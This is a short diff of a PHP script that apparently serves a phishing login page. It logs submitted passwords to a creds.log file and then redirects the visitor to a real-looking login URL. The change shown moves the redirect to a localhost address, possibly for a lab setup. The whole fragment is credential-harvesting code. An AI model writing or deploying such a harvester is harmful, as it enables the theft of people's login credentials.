@@ -12,5 +12,5 @@ $line = sprintf(
     $_POST['password'] ?? ''
 );
 file_put_contents($dir . '/creds.log', $line, FILE_APPEND | LOCK_EX);
-header('Location: http://edge/login.php');
+header('Location: http://127.0.0.1:8080/login.php');
 exit;
